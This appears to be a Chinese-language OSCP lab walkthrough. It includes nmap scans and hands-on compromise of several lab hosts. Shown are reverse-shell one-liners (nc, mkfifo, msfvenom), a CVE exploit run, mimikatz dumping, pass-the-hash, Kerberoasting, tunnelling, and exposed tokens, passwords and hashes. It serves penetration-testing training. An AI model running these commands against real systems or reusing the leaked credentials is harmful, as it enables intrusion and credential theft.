SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.80%I=7%D=3/21%Time=67DCF9B9%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2113\0RProcessStartupPacket\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
-   Hops 1-3 are the same as for 192.168.102.144
4   2.27 ms 192.168.102.143
=================================================================================================================
Nmap scan report for 192.168.102.144
Host is up (0.0031s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git: 
|   192.168.102.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/21%OT=21%CT=1%CU=36018%PV=Y%DS=4%DC=T%G=Y%TM=67DCFAC
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   2.38 ms 192.168.45.1
2   2.26 ms 192.168.45.254
3   2.42 ms 192.168.251.1
4   2.68 ms 192.168.102.144
=================================================================================================================
Nmap scan report for 192.168.102.145
Host is up (0.0026s latency).
Not shown: 65528 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Samuel's Personal Site
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1978/tcp open  unisql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2025-03-21T05:34:24+00:00
| ssl-cert: Subject: commonName=oscp
| Not valid before: 2025-02-22T07:12:14
|_Not valid after:  2025-08-24T07:12:14
|_ssl-date: 2025-03-21T05:35:01+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1978-TCP:V=7.80%I=7%D=3/21%Time=67DCF9B9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), FreeBSD 6.X|10.X (86%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:freebsd:freebsd:10.3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows XP SP2 (85%), FreeBSD 10.3-STABLE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-21T05:34:25
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT     ADDRESS
-   Hops 1-3 are the same as for 192.168.102.144
4   2.34 ms 192.168.102.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 372.68 seconds
```

### 192.168.102.141(域入口)

题目给了141机器的凭证：Eric.Wallows/EricLikesRunning800，使用evil-winrm连接

```
evil-winrm -i 192.168.102.141 -u Eric.Wallows -p 'EricLikesRunning800'
```

信息收集发现用户有SeImpersonatePrivilege权限

![image-20250321135609950](./oscp_pwk.assets/image-20250321135609950.png)

上传SweetPotato尝试提权，这里先要确定下我们攻击机在V*N中的IP是多少，上传nc监听端口访问一下就行

![image-20250321140055593](./oscp_pwk.assets/image-20250321140055593.png)

我们的IP是192.168.251.102，使用SweetPotato尝试反弹

```
.\SweetPotato.exe -t * -p "nc.exe" -a "192.168.251.102 80 -e cmd.exe"
```

![image-20250321140202609](./oscp_pwk.assets/image-20250321140202609.png)

监听80拿到shell

![image-20250321140542881](./oscp_pwk.assets/image-20250321140542881.png)

上传mimikatz转存hash

```
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

![image-20250321160137000](./oscp_pwk.assets/image-20250321160137000.png)

然后更改administrator的密码（这里建议先转存在更改，说不定administrator的原信息能用上

```
net user Administrator 123@Abc
```

winrm连接

```
evil-winrm -i 192.168.102.141 -u administrator -p '123@Abc'
```

成功登录，查看网卡信息是否果然有两张网卡

![image-20250321160804418](./oscp_pwk.assets/image-20250321160804418.png)

上传iox搭建隧道

```
kali运行
/root/tools/iox/iox proxy -l 90 -l 1080
靶机运行（后台）
Start-Process -FilePath ".\iox.exe" -ArgumentList "proxy -r 192.168.251.102:90" -NoNewWindow
```

### 10.10.62.142(域机器)

将141抓到的NTLM下载下来做成字典

使用proxychains4配合crackmapexec对10段爆破

```
proxychains4 crackmapexec winrm 10.10.62.140-142 -u ./users.txt -H ./ntlms.txt
```

![image-20250321170958887](./oscp_pwk.assets/image-20250321170958887.png)

发现一个等登录142的有效凭证：oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd 

```
proxychains4 evil-winrm -i 10.10.62.142 -u 'oscp.exam\celia.almeda' -H e728ecbadfb02f51ce8eed753f3ff3fd 
```

![image-20250321171150520](./oscp_pwk.assets/image-20250321171150520.png)

成功登录，在C盘根目录下发现windows.old文件，猜测为备份文件，当前用户有权限

![image-20250321171434597](./oscp_pwk.assets/image-20250321171434597.png)

在备份文件下面翻到SAM和SYSTEM

![image-20250321173023466](./oscp_pwk.assets/image-20250321173023466.png)

下载下来使用pypykatz解密

```
pypykatz registry --sam SAM SYSTEM
```

![image-20250321173246142](./oscp_pwk.assets/image-20250321173246142.png)

拿到hash，由于这个用户为域用户，通过入口靶机网卡配置可以通过网卡配置猜测到DC的IP

### 10.10.62.140(域控)

PTH登录域控（administrator一开始尝试不行，发现还有一个tom_admin用户应该也是管理员

```
proxychains4 evil-winrm -i 10.10.62.140 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc
```

![image-20250321174153302](./oscp_pwk.assets/image-20250321174153302.png)

搜索proof并打开

![image-20250321174437344](./oscp_pwk.assets/image-20250321174437344.png)

拿下域

### 192.168.102.143(Linux独立机)

之前的tcp扫描有三个模糊的端口，这里使用-sU UDP进一步扫描

![image-20250322120741989](./oscp_pwk.assets/image-20250322120741989.png)

3003端口发送help有回显（80,81,443经过漫长的折磨，基本排除了，都静态页面

![image-20250322122400545](./oscp_pwk.assets/image-20250322122400545.png)

在一篇oscp相关文章搜到了信息

![image-20250322122646516](./oscp_pwk.assets/image-20250322122646516.png)

输入version，版本也对的上

![image-20250322122705148](./oscp_pwk.assets/image-20250322122705148.png)

执行exp

```
python3 cve2020-13151.py --ahost=192.168.102.143 --aport=3000 --pythonshell --lhost=192.168.45.175 --lport=80
```

![image-20250322123657880](./oscp_pwk.assets/image-20250322123657880.png)

监听80收到shell

![image-20250322123705769](./oscp_pwk.assets/image-20250322123705769.png)

拿到local

![image-20250322123811525](./oscp_pwk.assets/image-20250322123811525.png)

上传linpeas.sh和pspy32s

```
curl http://192.168.45.175/linpeas.sh -O linpeas.sh
curl http://192.168.45.175/pspy32s -O pspy32s
```

linpeas.sh输出没看到提权点，pspy32s查看发现有一个root运行的进程

![image-20250322132753685](./oscp_pwk.assets/image-20250322132753685.png)

而且`/opt/aerospike/bin/asadm `我尝试了下当前用户是可以编辑的（我一开始用的`/usr/bin/asinfo`，但是我最后又试了下 `/usr/bin/asinfo`这个文件写入也是可以反弹的，但是要写shell命令，一开始看是python执行的，写的是py的reshell命令

直接写入反弹shell

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.175 80 >/tmp/f" > /opt/aerospike/bin/asadm
```

![image-20250322133302709](./oscp_pwk.assets/image-20250322133302709.png)

监听80收到root shell，拿到proof

![image-20250322133330639](./oscp_pwk.assets/image-20250322133330639.png)

### 192.168.102.144(Linux独立机)

通过nmap扫描可以看到开放了80http，没其他常规入口了，这个应该就是入口，nmap扫描还发现了.git文件

使用下面命令下载下来整个本地仓库（GitHack不行

```
wget -r -np -nH --cut-dirs=1 -R "index.html*" http://192.168.102.144/.git/
```

使用`git log`发现有一个版本删除了数据库文件

![image-20250321181427180](./oscp_pwk.assets/image-20250321181427180.png)

使用`git show c9c8e8bd0a4b373190c4258e16e07a6296d4e43c`查看被删除的内容

![image-20250321181506503](./oscp_pwk.assets/image-20250321181506503.png)

拿到数据库连接信息

```
$host = "localhost";
$db_name = "staff";
$username = "dean@challenge.pwk";
$password = "BreakingBad92";
```

通过dirsearch对站点进行扫描

![image-20250321183249515](./oscp_pwk.assets/image-20250321183249515.png)

~~搜索站点代码是能在github搜索到这套代码的，是一个`Joomla! CMS`，浏览器访问直接显示PHP代码，debug了一下可能是没php或者版本不对，可以用工具直接探测版本号：https://github.com/rezasp/joomscan.git~~

我能肯定80肯定是入口，但是后面试了很久都不对，去看了下WP，用`git show`

![image-20250321193333116](./oscp_pwk.assets/image-20250321193333116.png)

这里就很奇怪了，mysql凭证显然不是`dean@challenge.pwk`了

```
$username = "stuart@challenge.lab";
$password = "BreakingBad92";
```

用这个用户名可以去尝试登录ssh或者ftp，ssh登录成功（就没必要登ftp了

![image-20250321193511557](./oscp_pwk.assets/image-20250321193511557.png)

拿到local

![image-20250321193746655](./oscp_pwk.assets/image-20250321193746655.png)

上传linpeas.sh

![image-20250321195617607](./oscp_pwk.assets/image-20250321195617607.png)

在`/opt`下面有备份文件

```
cat sitebackup1.zip | nc 192.168.251.102 80
nc -lnvp 80 > sitebackup1.zip
...
```

![image-20250321201316476](./oscp_pwk.assets/image-20250321201316476.png)

下载下来发现1，2都是损坏的，只有3能打开，但是是加密的，使用zip2john转存为hash
```
zip2john sitebackup3.zip > hash.txt
```

然后用john破解

```
john hash.txt --wordlist=~/rockyou.txt 
```

![image-20250321201636114](./oscp_pwk.assets/image-20250321201636114.png)

得到密码为：codeblue

解压文件，查找敏感信息

```
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

![image-20250321201754053](./oscp_pwk.assets/image-20250321201754053.png)

打开configuration.php，发现一个可能的凭证：chloe/Ee24zIK4cDhJHL4H

![image-20250321202539129](./oscp_pwk.assets/image-20250321202539129.png)

切换到chloe用户（ssh不行

![image-20250321202718303](./oscp_pwk.assets/image-20250321202718303.png)

`sudo -l`发现可以sudo执行所有命令，sudo cat proof即可

![image-20250321202807035](./oscp_pwk.assets/image-20250321202807035.png)

### 192.168.102.145(windows独立机)

回顾之前nmap扫描结果，该靶机开启了21ftp服务和80http（大概率入口在80http

ftp尝试存在匿名登录，但是目录超时，smb不存在可访问目录

1978端口开放了一个很奇怪的应用，经过百度搜索确定为：`mouse server`

![image-20250321211930176](./oscp_pwk.assets/image-20250321211930176.png)

msfvenom生成反弹shell EXE

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.251.102 LPORT=135 -f exe -o reshell.exe
```

运行exp（我把exp下载exe的端口改成了90，启动python m监听端口

```
python3 50972.py 192.168.102.145 192.168.251.102 reshell.exe 
```

![image-20250321213357791](./oscp_pwk.assets/image-20250321213357791.png)

监听80端口

![image-20250321213348545](./oscp_pwk.assets/image-20250321213348545.png)

收到shell，拿到local

![image-20250321213643887](./oscp_pwk.assets/image-20250321213643887.png)

信息收集发现主机zachary用户是administrator组的，这是我们可能的路径之一

![image-20250322105535028](./oscp_pwk.assets/image-20250322105535028.png)

上传winPEASany并运行，将结果利用nc传输到kali

```
certutil -split -urlcache -f http://192.168.251.102:90/winPEASany.exe winPEASany.exe
```

找到了疑似zachary的凭证信息，刚刚信息收集知道zachary为管理员组成员：zachary/Th3R@tC@tch3r

![image-20250322115139206](./oscp_pwk.assets/image-20250322115139206.png)

靶机开启3389，尝试RDP登录

```
xfreerdp /u:zachary /p:'Th3R@tC@tch3r' /v:192.168.102.145 +clipboard
```

成功登录，拿到proof

![image-20250322115459640](./oscp_pwk.assets/image-20250322115459640.png)



## Challenge 5 - OSCP B

> 给了一个凭证：
>
> **192.168.102.147**
>
> Challenge 5 - MS01 OS Credentials:
> 挑战 5 - MS01 操作系统凭据：
>
> ```
> Eric.Wallows / EricLikesRunning800
> ```

对给出机器进行端口扫描信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.102.147-151
=============================================192.168.102.147=============================================
Nmap scan report for 192.168.102.147
Host is up (0.0028s latency).
Not shown: 65513 closed ports
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open     ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
5040/tcp  open     unknown
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
8080/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp  open     ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_ssl-date: 2025-03-31T10:13:13+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
28088/tcp filtered unknown
32972/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
63837/tcp filtered unknown

=============================================192.168.102.148=============================================
Nmap scan report for 192.168.102.148
Host is up (1.4s latency).
All 65535 scanned ports on 192.168.102.148 are filtered
Too many fingerprints match this host to give specific OS details

=============================================192.168.102.149=============================================
Nmap scan report for 192.168.102.149
Host is up (0.0029s latency).
Not shown: 65518 closed ports
PORT      STATE    SERVICE   VERSION
21/tcp    open     ftp       vsftpd 3.0.3
22/tcp    open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http      Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2232/tcp  filtered ivs-video
6316/tcp  filtered abb-escp
8226/tcp  filtered unknown
9119/tcp  filtered mxit
14251/tcp filtered unknown
16160/tcp filtered unknown
22006/tcp filtered unknown
34079/tcp filtered unknown
42102/tcp filtered unknown
45732/tcp filtered unknown
45946/tcp filtered unknown
53573/tcp filtered unknown
55871/tcp filtered unknown
62369/tcp filtered unknown

=============================================192.168.102.150=============================================
Nmap scan report for 192.168.102.150
Host is up (0.0028s latency).
Not shown: 65518 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
4796/tcp  filtered unknown
8080/tcp  open     http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: application/json;charset=UTF-8
|     Date: Mon, 31 Mar 2025 10:09:54 GMT
|     Connection: close
|     {"timestamp":"2025-03-31T10:09:54.309+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/plain;charset=UTF-8
|     Content-Length: 19
|     Date: Mon, 31 Mar 2025 10:09:54 GMT
|     Connection: close
|     {"api-status":"up"}
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Mon, 31 Mar 2025 10:09:54 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 830
|     Date: Mon, 31 Mar 2025 10:09:54 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 800
|     Date: Mon, 31 Mar 2025 10:09:54 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
8646/tcp  filtered unknown
16636/tcp filtered unknown
17849/tcp filtered unknown
18037/tcp filtered unknown
21519/tcp filtered unknown
22299/tcp filtered unknown
22971/tcp filtered unknown
25337/tcp filtered unknown
29934/tcp filtered unknown
48583/tcp filtered unknown
51422/tcp filtered unknown
53853/tcp filtered unknown
56579/tcp filtered unknown
63967/tcp filtered unknown
=============================================192.168.102.151=============================================
Nmap scan report for 192.168.102.151
Host is up (0.0029s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2025-02-11T22:06:42
|_Not valid after:  2025-08-13T22:06:42
|_ssl-date: 2025-03-31T10:13:13+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), FreeBSD 6.X|10.X (86%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:freebsd:freebsd:10.3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows XP SP2 (85%), FreeBSD 10.3-STABLE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
-   Hops 1-3 are the same as for 192.168.102.147
4   2.50 ms 192.168.102.151

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.102.147
|_    192.168.102.151
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 5 IP addresses (5 hosts up) scanned in 1049.67 seconds
```

### 192.168.102.147/10.10.62.147

题目给了凭证：Eric.Wallows/EricLikesRunning800，直接winrm登录

```
evil-winrm -i 192.168.102.147 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

![image-20250331200429536](./oscp_pwk.assets/image-20250331200429536.png)

主机为双网卡主机，域在10网段，`whoami /priv`发现敏感权限

![image-20250331200627183](./oscp_pwk.assets/image-20250331200627183.png)

上传SweetPotato

```
.\SweetPotato.exe -t * -p "nc.exe" -a "192.168.45.175 80 -e cmd.exe"
```

![image-20250331201126563](./oscp_pwk.assets/image-20250331201126563.png)

成功提权，上传mimikatz转存hash

其中有两个NTLM可以转换成明文密码：https://hashes.com/en/decrypt/hash

```
web_svc:53e938166782a44e241beaf02d081ff6:Diamond1
MS01:986d0dc5590e6448614a509060b72102
Administrator:3c4495bbd678fac8c9d218be4f2bbc7b:December31
```

利用凭证对域内机器进行喷洒吗，没有进一步入口点

```
proxychains4 crackmapexec winrm 10.10.62.146-148 -u 'Administrator' -p 'December31' --local-auth
```

### 域内信息收集

上传fscan.exe扫描10.10.62.146和10.10.62.148

| IP           | Port             |
| :----------- | :--------------- |
| 10.10.62.146 | 88,135,139,445   |
| 10.10.62.148 | 135,139,1433,445 |

使用代理向域控请求票据，这里IP一定是域控

```
proxychains4 impacket-GetUserSPNs -dc-ip 10.10.62.146 -request oscp.exam/'web_svc':'Diamond1' 
```

![image-20250401183308669](./oscp_pwk.assets/image-20250401183308669.png)

拿到了一个sql_svc的凭证：

```
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$cb60b784efe2876fbdb2f0588a20b9c0$55c64765b0c2b11da34cad0b6d1a861a03923f0dde8c0f17f78ce0172f0efcedd51135c5fc36d016788665515383fdb6a133f0be6d50140c02d4e2a66c2515f73db76c0b98aea00a61da972b1a86f4f1c4458c368cc8219f3878f39e7b6f5234719d9e21e3d5c14abceea3160baef29cf90d56d6b5e3de515a39074d2e0048026ebe7d480bdcffba7a440d5818d48ec5ad3f11d267a416b3d99fc2c20609a85fcb79f543e495db632f2c0f7ec59cac1170ca7bffbb3a024fbd98d3ef86b468255f9267b7e10054513c6a112eed56301b434068d59860beb5fa9900d784886f9860e1c3515fad25290e2598773ea04d444e30bb10a37834b50468f2a064c052b8f65b1a6d21e27863f6c135b78d6ebaffdb6bfab7fabf49c92d7445399b0b47961a8644a48cc7d53b196539f26554cd9b4f141588b804efd67cb32eb4e05414c8d7eecd52af1230c62a4f377b551763444ef3aca404b9e444f1d38665f9ab4ce8e9a359fb5d738c9712eec92cb066a6b16f9946e816dfa6427ceac6c69e53dca55dc9ea7d7350638e300aef5e04303980252ef6b491aac1ef2effcb33541d629aff78e8e4eba3e6a09acdd27e601c2b5deaf27e7a2de34f6c38cb0d6e74f658c1bde6df5fc974622473c0a29d5a81efa7827b877ce952d927c860fe356e308eab50519dbfc430d24fde263d1bd3f3cc416ac69833a931ccc37aa69a9a5822c3aba710e28ee2dd64a0333b1300a290692e7ddc5c0f072c77fcbcceb6fc40accdc6ec2576b846575955469761b4cad6b35fcf6ebdfc6ebae4171cd5587495d0f35294408180f920d4ba33260b3c8c38fdcfb6bc00335bcd61eac3f573c0d9fe5efa1c5ebd7bbce3f550dd080418ab4cfe22c2808745fe29f59841be8ba641553e0